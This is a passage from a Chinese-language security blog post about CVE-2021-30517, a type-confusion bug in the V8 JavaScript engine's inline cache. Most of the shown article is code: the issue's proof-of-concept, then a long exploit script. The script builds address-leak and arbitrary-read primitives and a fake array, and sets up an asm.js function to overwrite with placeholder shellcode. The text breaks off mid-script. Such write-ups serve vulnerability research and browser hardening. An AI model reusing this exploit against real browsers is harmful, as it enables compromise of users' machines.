<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CVE-2021-30517 ：V8 IC 中的类型混淆漏洞 | ret2ver</title><meta name="author" content="Vergissmeinnicht"><meta name="copyright" content="Vergissmeinnicht"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集该 CVE 对应的 Issue 为 Issue 1203122 ，是一个类型混淆的洞。同时非常贴心的给了 Poc  12345678910111213141516171819202122function main() &amp;#123;    class C &amp;#123;        m() &amp;#123;            super.prototype        &amp;#125;">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-30517 ：V8 IC 中的类型混淆漏洞">
<meta property="og:url" content="https://ret2ver.github.io/2021/12/21/CVE-2021-30517-%EF%BC%9AV8-IC-%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="ret2ver">
<meta property="og:description" content="信息收集该 CVE 对应的 Issue 为 Issue 1203122 ，是一个类型混淆的洞。同时非常贴心的给了 Poc  12345678910111213141516171819202122function main() &amp;#123;    class C &amp;#123;        m() &amp;#123;            super.prototype        &amp;#125;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2021-12-21T05:57:21.000Z">
<meta property="article:modified_time" content="2022-05-04T12:13:00.159Z">
<meta property="article:author" content="Vergissmeinnicht">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ret2ver.github.io/2021/12/21/CVE-2021-30517-%EF%BC%9AV8-IC-%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2021-30517 ：V8 IC 中的类型混淆漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-04 20:13:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/04/29/RkrKDQiodbYj2eu.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">32</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ret2ver</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2021-30517 ：V8 IC 中的类型混淆漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-12-21T05:57:21.000Z" title="Created 2021-12-21 13:57:21">2021-12-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-05-04T12:13:00.159Z" title="Updated 2022-05-04 20:13:00">2022-05-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Browser/">Browser</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Browser/V8/">V8</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Browser/V8/CVE/">CVE</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Browser/V8/CVE/Inline-Cache/">Inline Cache</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2021-30517 ：V8 IC 中的类型混淆漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>该 <code>CVE</code> 对应的 <code>Issue</code> 为 <a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1203122">Issue 1203122</a> ，是一个类型混淆的洞。同时非常贴心的给了 <code>Poc</code> </p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">        <span class="title function_">m</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">super</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    C.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = f</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> c = <span class="keyword">new</span> <span class="title function_">C</span>()</span><br><span class="line">    c.<span class="property">x0</span> = <span class="number">1</span></span><br><span class="line">    c.<span class="property">x1</span> = <span class="number">1</span></span><br><span class="line">    c.<span class="property">x2</span> = <span class="number">1</span></span><br><span class="line">    c.<span class="property">x3</span> = <span class="number">1</span></span><br><span class="line">    c.<span class="property">x4</span> = <span class="number">0x42424242</span> / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    f.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">    c.<span class="title function_">m</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i) &#123;</span><br><span class="line">    <span class="title function_">main</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有 <code>EXP</code></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> H = <span class="keyword">new</span> <span class="keyword">class</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32a</span> = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">d64a</span> = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">i2d</span>(<span class="params">low, high=<span class="number">0</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32a</span>[<span class="number">0</span>] = low</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">u32a</span>[<span class="number">1</span>] = high</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">d64a</span>[<span class="number">0</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">d2i</span>(<span class="params">d</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">d64a</span>[<span class="number">0</span>] = d</span><br><span class="line">        <span class="keyword">return</span> [<span class="variable language_">this</span>.<span class="property">u32a</span>[<span class="number">0</span>], <span class="variable language_">this</span>.<span class="property">u32a</span>[<span class="number">1</span>]]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak_addrof_elements</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">O</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Object</span> &#123;</span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">super</span>()</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x0</span> = <span class="variable language_">this</span></span><br><span class="line">            <span class="variable language_">this</span>[<span class="number">0</span>] = <span class="number">0x41424344</span> / <span class="number">2</span></span><br><span class="line">            <span class="variable language_">this</span>[<span class="number">1</span>] = <span class="number">0x45464748</span> / <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">m</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property">length</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> o = <span class="keyword">new</span> <span class="title function_">O</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> proto = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        O.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto</span><br><span class="line">        proto.<span class="property">length</span></span><br><span class="line">        <span class="keyword">return</span> o.<span class="title function_">m</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">const</span> value = <span class="title function_">f</span>()</span><br><span class="line">        <span class="keyword">if</span> (value !== <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [o, value-<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [o, o_fa_addr] = <span class="title function_">leak_addrof_elements</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [read, addrof] = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span> &#123;</span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">super</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">m</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property">length</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">A</span>()</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> proto = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto</span><br><span class="line">        proto.<span class="property">length</span></span><br><span class="line">        <span class="keyword">return</span> a.<span class="title function_">m</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">const</span> value = <span class="title function_">f</span>()</span><br><span class="line">        <span class="keyword">if</span> (value !== <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">        a.<span class="property">length</span> = (addr - <span class="number">8</span>) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">const</span> l3 = <span class="title function_">f</span>(<span class="number">0</span>)</span><br><span class="line">        a.<span class="property">length</span> = (addr - <span class="number">8</span> + <span class="number">2</span>) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">const</span> h3 = <span class="title function_">f</span>(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ((h3 &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xff000000</span>) + (l3 &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">        o[<span class="number">0</span>] = obj</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">read</span>(o_fa_addr + <span class="number">8</span>) - <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [read, addrof]</span><br><span class="line">&#125;())</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellcode = [<span class="number">0x90909090</span>, <span class="number">0x90909090</span>, <span class="number">0xcccccccc</span>, <span class="number">0x90909090</span>]</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Module</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&quot;use asm&quot;</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">f</span>: f&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> da = [</span><br><span class="line">    <span class="number">1</span>,<span class="number">1</span>, <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>, <span class="number">2.2</span>,</span><br><span class="line">    <span class="number">3.3</span>, <span class="number">3.3</span>,</span><br><span class="line">    <span class="number">4.4</span>, <span class="number">4.4</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> da_helper = [<span class="number">1.1</span>]</span><br><span class="line"><span class="keyword">const</span> oa_helper = [&#123;<span class="attr">x</span>: <span class="number">0x41414142</span>/<span class="number">2</span>&#125;]</span><br><span class="line"><span class="keyword">const</span> buf_helper = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">const</span> dv_helper = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf_helper)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>/<span class="number">4</span>; ++i) &#123;</span><br><span class="line">    dv_helper.<span class="title function_">setUint32</span>(i*<span class="number">4</span>, <span class="number">0x41414100</span> + i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> da_addr = <span class="title function_">addrof</span>(da)</span><br><span class="line"><span class="keyword">const</span> da_elements_addr = da_addr - <span class="number">0x50</span></span><br><span class="line"><span class="keyword">const</span> da_map = <span class="title function_">read</span>(da_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> map_map = <span class="title function_">read</span>(da_map-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fake_array_addr = da_elements_addr + <span class="number">0x28</span></span><br><span class="line"><span class="keyword">const</span> fake_elements_addr = da_elements_addr + <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">da[<span class="number">0</span>] = H.<span class="title function_">i2d</span>((map_map&amp;<span class="number">0xffffff</span>)&lt;&lt;<span class="number">8</span>, (map_map&gt;&gt;<span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">da[<span class="number">1</span>] = H.<span class="title function_">i2d</span>(<span class="number">0</span>)</span><br><span class="line">da[<span class="number">2</span>] = H.<span class="title function_">i2d</span>(((fake_array_addr+<span class="number">1</span>)&amp;<span class="number">0xffffff</span>)&lt;&lt;<span class="number">8</span>, ((fake_array_addr+<span class="number">1</span>)&gt;&gt;<span class="number">24</span>))</span><br><span class="line">da[<span class="number">3</span>] = H.<span class="title function_">i2d</span>(<span class="number">0</span>)</span><br><span class="line">da[<span class="number">4</span>] = H.<span class="title function_">i2d</span>(da_map)</span><br><span class="line">da[<span class="number">5</span>] = H.<span class="title function_">i2d</span>(fake_elements_addr+<span class="number">1</span>, <span class="number">0x1000</span>)</span><br><span class="line">da[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fake_array = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span> &#123;</span><br><span class="line">        <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">super</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x1</span> = <span class="number">0x41414142</span> / <span class="number">2</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x2</span> = <span class="number">0x42424242</span> / <span class="number">2</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x3</span> = <span class="number">0x43434344</span> / <span class="number">2</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">x4</span> = (da_elements_addr + <span class="number">8</span> + <span class="number">2</span>) / <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">m</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title function_">A</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> proto = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">        A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto</span><br><span class="line">        proto.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line">        <span class="keyword">return</span> a.<span class="title function_">m</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">const</span> value = <span class="title function_">f</span>()</span><br><span class="line">        <span class="keyword">if</span> (value.<span class="property">length</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;())</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array[<span class="number">7</span>] = H.<span class="title function_">i2d</span>(addr-<span class="number">0x8</span>+<span class="number">1</span>, <span class="number">0x5</span>)</span><br><span class="line">    <span class="keyword">return</span> H.<span class="title function_">d2i</span>(da_helper[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_write</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> evil_func = <span class="title class_">Module</span>().<span class="property">f</span></span><br><span class="line"><span class="title function_">evil_func</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> evil_func_addr = <span class="title function_">addrof</span>(evil_func)</span><br><span class="line"><span class="keyword">const</span> shared_info_addr = <span class="title 